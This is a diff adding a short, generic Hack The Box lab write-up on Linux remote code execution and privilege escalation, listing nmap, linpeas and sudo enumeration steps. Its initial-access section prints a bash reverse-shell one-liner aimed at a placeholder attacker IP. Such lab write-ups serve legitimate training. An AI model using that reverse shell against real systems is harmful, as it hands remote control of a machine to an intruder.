@@ -1,0 +1,84 @@
+# Hack The Box — Linux RCE Exploitation Report
+
+## Overview
+
+This report documents the exploitation of Linux-based machines from Hack The Box, focusing on achieving Remote Code Execution (RCE) and privilege escalation.
+
+---
+
+## Methodology
+
+1. Reconnaissance (Nmap scanning)
+2. Service enumeration
+3. Exploitation of vulnerable service
+4. Gaining shell access
+5. Privilege escalation
+
+---
+
+## Reconnaissance
+
+```bash
+nmap -sC -sV <target>
+```
+
+Findings:
+
+* Open ports (e.g. 22, 80)
+* Web application exposed
+
+---
+
+## Initial Access
+
+Discovered vulnerability in web application:
+
+* Injection point identified
+* Payload used to gain shell access
+
+Example payload:
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+---
+
+## Privilege Escalation
+
+Steps:
+
+* Enumerated system using:
+
+```bash
+linpeas.sh
+```
+
+Findings:
+
+* Misconfigured sudo permissions OR SUID binaries
+
+Exploit:
+
+```bash
+sudo -l
+```
+
+Gained root access.
+
+---
+
+## Impact
+
+* Full system compromise
+* Ability to execute commands as root
+* Data access and system control
+
+---
+
+## Skills Demonstrated
+
+* Linux enumeration
+* Exploitation
+* Reverse shell handling
+* Privilege escalation
